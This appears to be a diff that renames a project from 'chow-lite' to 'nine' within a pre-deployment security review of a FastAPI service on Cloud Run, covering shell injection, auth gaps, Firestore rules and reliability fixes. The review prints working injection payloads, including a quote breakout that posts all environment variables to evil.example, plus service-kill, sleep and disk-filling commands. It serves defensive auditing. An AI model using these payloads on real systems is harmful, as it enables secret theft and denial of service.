@@ -1,6 +1,6 @@
-# chow-lite — Security & Reliability Review (pre-public-deploy)
+# nine — Security & Reliability Review (pre-public-deploy)
 
-**Repo:** `/Users/adam26/chow-work/chow-lite` (github.com/optimizedwf/chow-lite, public MIT)
+**Repo:** `/Users/adam26/nine-work/nine` (github.com/optimizedwf/nine, public MIT)
 **Scope:** secrets, RCE/command injection, API surface, Firestore rules, deploy artifacts, reliability
 **Date:** 2026-08 (pre-submission). **Auditor:** security/reliability engineer pass.
 **Method:** full source read + live execution of the real code paths (FastAPI TestClient against `deploy/server.py`, bash simulation of the exact command construction, Docker image-content simulation). Every "verified" finding below was reproduced.
@@ -9,10 +9,10 @@
 
 ## Executive summary
 
-The core library (`chowlite/`, chains, gates, ledger, CLI) is clean, well-structured Python with a genuinely good model (evidence-gated loop, candidate-only learning). The **deploy layer is not production-ready and, as shipped, cannot boot on Cloud Run**. The critical chain is:
+The core library (`nine/`, chains, gates, ledger, CLI) is clean, well-structured Python with a genuinely good model (evidence-gated loop, candidate-only learning). The **deploy layer is not production-ready and, as shipped, cannot boot on Cloud Run**. The critical chain is:
 
 1. `POST /v1/submit` is **unauthenticated and public** (`deploy.sh:20 --allow-unauthenticated`).
-2. The user `task` string is interpolated into a **bash command** (`deploy/server.py:186`, executed with `shell=True` in `chowlite/runtime/workflows.py:111-113`).
+2. The user `task` string is interpolated into a **bash command** (`deploy/server.py:186`, executed with `shell=True` in `nine/runtime/workflows.py:111-113`).
 3. The container runs **as root** with `git`+`curl` installed and the full environment (including `GEMINI_API_KEY`, if set) readable.
 
 Net result: **any anonymous internet user can execute arbitrary shell commands inside the Cloud Run container** — exfiltrate the Gemini API key, read/write/delete the Firestore ledger via the app's service account, kill the service, or burn CPU/memory. This is trivially exploitable with a 30-character payload (verified). Separately, the Dockerfile **never copies `deploy/` into the image**, so `uvicorn deploy.server:app` fails at boot (verified by simulation), and Cloud Run's **read-only filesystem** (except `/tmp`) means the EXECUTE step's artifact writes would fail anyway (per the Cloud Run container contract).
@@ -26,7 +26,7 @@ Good news: fixes are small. The whole RCE class disappears by **not putting user
 ### P0 — must fix before Adam deploys the live URL publicly
 
 #### P0-1 · Unauthenticated remote RCE via shell interpolation in `/v1/submit`  — VERIFIED
-- **Where:** `deploy/server.py:186-189` (`cmd = f"echo '{task[:200]}' > task.txt; ..."`, `Node(id="collect", kind="bash", command=cmd)`) → `chowlite/runtime/workflows.py:111-113` (`sp.run(node.command, shell=True, ...)`). Same pattern in the local CLI at `chowlite/cli.py:119`.
+- **Where:** `deploy/server.py:186-189` (`cmd = f"echo '{task[:200]}' > task.txt; ..."`, `Node(id="collect", kind="bash", command=cmd)`) → `nine/runtime/workflows.py:111-113` (`sp.run(node.command, shell=True, ...)`). Same pattern in the local CLI at `nine/cli.py:119`.
 - **Exploit:** the task is wrapped in single quotes; a task containing `'` breaks out. Proven payloads (each ≤ 200 chars, so the `task[:200]` truncation does not help):
   ```
   build'; curl -s -d "$(env)" https://evil.example/x; echo '        # exfiltrate ALL env vars (GEMINI_API_KEY)
@@ -35,7 +35,7 @@ Good news: fixes are small. The whole RCE class disappears by **not putting user
   build'; pkill -f uvicorn; echo '                                  # kill the service
   ```
   Note `$(...)`/backticks inside single quotes do *not* execute — the working vector is the single-quote breakout, which is the first thing any judge or scanner tries against `echo '...'`.
-- **Impact:** full RCE as root (Dockerfile has no `USER`). Concrete attacker wins: (a) exfiltrate `GEMINI_API_KEY` → run up a real bill on Adam's Google account; (b) use the app's service-account credentials to read/write/delete the whole Firestore `chowlite-jobs` collection; (c) kill the demo mid-judging; (d) use the instance as a free compute/smokescreen. `git`+`curl` are preinstalled for exfiltration (`Dockerfile:6`).
+- **Impact:** full RCE as root (Dockerfile has no `USER`). Concrete attacker wins: (a) exfiltrate `GEMINI_API_KEY` → run up a real bill on Adam's Google account; (b) use the app's service-account credentials to read/write/delete the whole Firestore `nine-jobs` collection; (c) kill the demo mid-judging; (d) use the instance as a free compute/smokescreen. `git`+`curl` are preinstalled for exfiltration (`Dockerfile:6`).
 - **Why it matters for a demo:** a malicious (or even curious) judge will try this. It is the single most embarrassing possible outcome.
 - **Fix (minimal, removes the entire class):** do not interpolate user input into shell. The demo node only needs three constant writes:
   ```python
@@ -45,18 +45,18 @@ Good news: fixes are small. The whole RCE class disappears by **not putting user
   (job_dir / "EVAL.json").write_text(eval_json)
   wf.add_node(Node(id="collect", kind="tool", run=lambda inputs, jd: {"done": True}))
   ```
-  (or keep a `bash` node whose command contains **zero** user data — pass the task via a file). If shell is truly needed, use `sp.run([...], shell=False)` with a fixed argv and feed the task through stdin. Do **not** rely on escaping/quoting — `shlex.quote` is not a security boundary against `\n`/`$()` when the shell re-parses, and the 200-char truncation invites truncation-dependent bypasses. Also harden `WorkflowExecutor._run_node` (workflows.py:111): reject `shell=True` commands that contain any interpolated user bytes, and apply the same rule in `chowlite/cli.py:119`.
+  (or keep a `bash` node whose command contains **zero** user data — pass the task via a file). If shell is truly needed, use `sp.run([...], shell=False)` with a fixed argv and feed the task through stdin. Do **not** rely on escaping/quoting — `shlex.quote` is not a security boundary against `\n`/`$()` when the shell re-parses, and the 200-char truncation invites truncation-dependent bypasses. Also harden `WorkflowExecutor._run_node` (workflows.py:111): reject `shell=True` commands that contain any interpolated user bytes, and apply the same rule in `nine/cli.py:119`.
 
 #### P0-2 · Dockerfile never copies `deploy/` → image cannot boot → live deploy broken  — VERIFIED
-- **Where:** `Dockerfile:9-19`. Only `pyproject.toml`, `README.md`, `chowlite/`, `schemas/` are copied; the container command is `uvicorn deploy.server:app`.
+- **Where:** `Dockerfile:9-19`. Only `pyproject.toml`, `README.md`, `nine/`, `schemas/` are copied; the container command is `uvicorn deploy.server:app`.
 - **Evidence:** simulated the image contents (copied exactly what the Dockerfile copies) and ran `import deploy.server` → `ModuleNotFoundError: No module named 'deploy'`. So `gcloud run deploy` succeeds in creating the service, then the revision crashes on boot and Cloud Run marks it unhealthy. **The demo video's "live on Google Cloud" segment cannot be recorded with this Dockerfile.**
 - **Fix:** add `COPY deploy ./deploy` to the Dockerfile (one line). Also add `COPY .dockerignore` if created (P1-14).
 
 #### P0-3 · Cloud Run filesystem is read-only except `/tmp` → EXECUTE cannot write artifacts → every submit 500s
-- **Where:** `deploy/server.py:52` (`LEDGER_PATH = Path("jobs/ledger.jsonl")`, `WORKDIR = Path("work")`) and `chowlite/runtime/workflows.py:135` (`job_dir.mkdir(...)`).
+- **Where:** `deploy/server.py:52` (`LEDGER_PATH = Path("jobs/ledger.jsonl")`, `WORKDIR = Path("work")`) and `nine/runtime/workflows.py:135` (`job_dir.mkdir(...)`).
 - **Detail:** per the Cloud Run container contract, only `/tmp` is writable; `/app` is read-only. `WorkflowExecutor.__init__` does `self.workdir.mkdir()` → `PermissionError`/`EROFS` → unhandled → `POST /v1/submit` 500s for every task that reaches EXECUTE. Even on gen2 with any ephemeral overlay, local-FS state is per-instance and lost on recycle — and with `maxScale: 2`, two instances would have divergent ledgers.
 - **Impact:** the public API's core endpoint does not work on Cloud Run as configured; the JSONL fallback (P1-7) silently "works" nowhere useful.
-- **Fix:** point runtime state at `/tmp`: `LEDGER_PATH = Path(os.environ.get("LEDGER_PATH", "/tmp/chowlite/jobs/ledger.jsonl"))`, `WORKDIR = Path(os.environ.get("WORKDIR", "/tmp/chowlite/work"))` — and treat Firestore as the only durable store (JSONL under /tmp is crash-only). Verify with a real `gcloud run deploy` before recording the GCP proof segment.
+- **Fix:** point runtime state at `/tmp`: `LEDGER_PATH = Path(os.environ.get("LEDGER_PATH", "/tmp/nine/jobs/ledger.jsonl"))`, `WORKDIR = Path(os.environ.get("WORKDIR", "/tmp/nine/work"))` — and treat Firestore as the only durable store (JSONL under /tmp is crash-only). Verify with a real `gcloud run deploy` before recording the GCP proof segment.
 
 #### P0-4 · No auth + no rate limit on a public endpoint that spends real money and writes shared state
 - **Where:** `deploy/deploy.sh:20` (`--allow-unauthenticated`), `deploy/server.py:168-201` (no auth, no throttle, no size cap).
@@ -66,7 +66,7 @@ Good news: fixes are small. The whole RCE class disappears by **not putting user
 ### P1 — should fix before public deploy / will break the demo
 
 #### P1-5 · A plain apostrophe in a normal task breaks the run — job stuck in "fixing" forever — VERIFIED
-- **Where:** `deploy/server.py:186` + `chowlite/runtime/workflows.py:157-163`.
+- **Where:** `deploy/server.py:186` + `nine/runtime/workflows.py:157-163`.
 - **Evidence:** `POST /v1/submit {"task": "build it's a trap"}` → shell syntax error (unterminated quote) → exit code 2 → gate verdict `FIX` → `job.transition("fixing")` … and the server has **no fix loop**, so the job sits in `fixing` forever (confirmed in the ledger: `{"by_status": {"fixing": 1, ...}}`). Any judge typing a contraction ("it's", "don't") triggers this.
 - **Fix:** same as P0-1 (write files from Python, no shell). Optionally add a fix-loop in the server path or transition FIX → blocked after one attempt.
 
@@ -86,17 +86,17 @@ Good news: fixes are small. The whole RCE class disappears by **not putting user
 - **Fix:** Pydantic `max_length` (P1-6) + a middleware rejecting `Content-Length > 1MB` with 413.
 
 #### P1-9 · Gemini call: no timeout, no retry, no 429 handling — VERIFIED by code read
-- **Where:** `chowlite/router/classifier.py:113` (`resp = self.model.generate_content(prompt)`; `build_router` in `server.py:108-150` catches only constructor errors).
+- **Where:** `nine/router/classifier.py:113` (`resp = self.model.generate_content(prompt)`; `build_router` in `server.py:108-150` catches only constructor errors).
 - **Impact:** a hung or 429-quota Gemini API call hangs the request thread up to Cloud Run's 300s timeout (P1-10) and surfaces as a 500 — the demo dies the moment the free-tier quota trips (it will, during judging if the site is public).
 - **Fix:** (a) pass a client timeout (`genai.Client(..., http_options=...timeout=15)`); (b) wrap `classify()` in try/except → keyword fallback (that's the stated design intent — the fallback currently only covers router *construction*); (c) retry 429 with exponential backoff (2-3 tries).
 
 #### P1-10 · Bash node blocks the request thread up to 300s → trivial availability DoS
-- **Where:** `deploy/server.py:189` (Node default `timeout_seconds=300` from `chowlite/runtime/workflows.py:32`), `deploy/cloud-run.yaml` (`timeoutSeconds: 300`, `containerConcurrency: 8`, `maxScale: 2`).
+- **Where:** `deploy/server.py:189` (Node default `timeout_seconds=300` from `nine/runtime/workflows.py:32`), `deploy/cloud-run.yaml` (`timeoutSeconds: 300`, `containerConcurrency: 8`, `maxScale: 2`).
 - **Impact:** task `build'; sleep 200; echo '` (12 chars) pins a thread for 200s. 16 concurrent sleepers across 2 instances make the whole public API unavailable for minutes; also Cloud Run's 300s request cap races the 300s node timeout, so clients see 503/504 while the node keeps running.
 - **Fix:** set a tight `timeout_seconds` (e.g., 30) on the public-path node; consider running execution as a background task with the job id returned immediately and status polled (nicer demo UX too).
 
 #### P1-11 · Artifact scan `read_bytes()` OOMs on attacker-created giant files — VERIFIED
-- **Where:** `chowlite/runtime/workflows.py:166` and `:192` (`data = p.read_bytes()` for every new file in the job dir).
+- **Where:** `nine/runtime/workflows.py:166` and `:192` (`data = p.read_bytes()` for every new file in the job dir).
 - **Evidence:** `build'; dd if=/dev/zero of=big.bin bs=1M count=500; echo '` fits in 200 chars and creates a 500MB file; the executor then reads it fully into memory → OOM vs the 512Mi limit → instance crash.
 - **Fix:** skip/truncate artifacts above a size cap (e.g., 5MB), cap artifact count, and read in chunks.
 
@@ -107,7 +107,7 @@ Good news: fixes are small. The whole RCE class disappears by **not putting user
 
 #### P1-13 · Firestore rules: any authenticated Firebase user can read/write ALL job docs
 - **Where:** `deploy/firestore.rules:5` (`allow read, write: if request.auth != null;`).
-- **Detail:** the app's server SDK (service account) **bypasses** security rules, so the app works regardless of these rules. But if the GCP project has Firebase Auth enabled (Google sign-in or anonymous), any authenticated client can enumerate, dump, modify, and delete the entire `chowlite-jobs` collection through the Firestore REST/Web SDK. It's one `curl` per doc.
+- **Detail:** the app's server SDK (service account) **bypasses** security rules, so the app works regardless of these rules. But if the GCP project has Firebase Auth enabled (Google sign-in or anonymous), any authenticated client can enumerate, dump, modify, and delete the entire `nine-jobs` collection through the Firestore REST/Web SDK. It's one `curl` per doc.
 - **Fix:** since the app never authenticates Firebase users, tighten to `allow read, write: if false;` (server SDK unaffected). At minimum require a role claim (`request.auth.token.admin == true`).
 
 ### P2 — nice-to-have / hygiene
@@ -122,7 +122,7 @@ Good news: fixes are small. The whole RCE class disappears by **not putting user
 `pyproject.toml:9-13` uses `>=` for everything (google-adk, google-genai, fastapi, uvicorn, google-cloud-firestore); `Dockerfile:13` installs `google-cloud-firestore` unpinned. A breaking release between now and judging changes behavior silently. Pin exact versions (at least in the Dockerfile).
 
 #### P2-17 · JSONL append is not atomic or locked
-`chowlite/ledger/ledger.py:148-150` appends with plain `open(path,"a")`; concurrent submits (FastAPI threadpool, sync endpoints) can interleave writes and race the in-memory dict. Only affects the JSONL fallback; fix with a `threading.Lock` or prefer Firestore (see P1-7).
+`nine/ledger/ledger.py:148-150` appends with plain `open(path,"a")`; concurrent submits (FastAPI threadpool, sync endpoints) can interleave writes and race the in-memory dict. Only affects the JSONL fallback; fix with a `threading.Lock` or prefer Firestore (see P1-7).
 
 #### P2-18 · Raw task text + internal container paths exposed via the public API — VERIFIED
 - `deploy/server.py:178` stores `input={"task": task}` raw; `job_detail` (`server.py:210`) returns it to anyone; `redact()` in `classifier.py:159,185` only covers `route_decision.task_redacted`. So anything a user pastes into a task (including secrets) is persisted and publicly readable, and artifact records expose absolute container paths (`/app/work/<job_id>/...`) that help attackers map the environment.
@@ -141,7 +141,7 @@ Good news: fixes are small. The whole RCE class disappears by **not putting user
 
 ## Ship-blockers (must fix before Adam deploys the public URL)
 
-1. **Kill the shell interpolation** (P0-1): write `task.txt`/`FINAL_REPORT.md`/`EVAL.json` from Python; no user bytes in any bash command. Also fix `chowlite/cli.py:119`.
+1. **Kill the shell interpolation** (P0-1): write `task.txt`/`FINAL_REPORT.md`/`EVAL.json` from Python; no user bytes in any bash command. Also fix `nine/cli.py:119`.
 2. **`COPY deploy ./deploy`** in the Dockerfile (P0-2) — otherwise nothing boots.
 3. **Move runtime state under `/tmp`** (P0-3) and make Firestore failure loud, not silent (P1-7).
 4. **Token-gate `/v1/submit`** + Pydantic `task: str, max_length=2000` + request size cap + a simple rate limit (P0-4, P1-6, P1-8).
@@ -184,12 +184,12 @@ curl -s https://<YOUR>.run.app/v1/jobs | python3 -m json.tool | grep -A2 '"input
 
 | Fix | Files touched | ~Lines |
 |---|---|---|
-| P0-1 no-shell artifact writes | deploy/server.py, chowlite/cli.py | +10/-5 |
+| P0-1 no-shell artifact writes | deploy/server.py, nine/cli.py | +10/-5 |
 | P0-2 COPY deploy | Dockerfile | +1 |
 | P0-3 /tmp paths + loud Firestore | deploy/server.py | +6 |
 | P0-4 token + rate limit | deploy/server.py (+deploy.sh env) | +25 |
 | P1-6/8 Pydantic body + 1MB cap | deploy/server.py | +10 |
-| P1-9 timeout/retry/fallback | chowlite/router/classifier.py | +10 |
+| P1-9 timeout/retry/fallback | nine/router/classifier.py | +10 |
 | P1-10/11 node timeout + artifact caps | deploy/server.py, workflows.py | +8 |
 | P1-12 Secret Manager | deploy.sh | +3 |
 | P1-13 rules `if false` | deploy/firestore.rules | +1 |
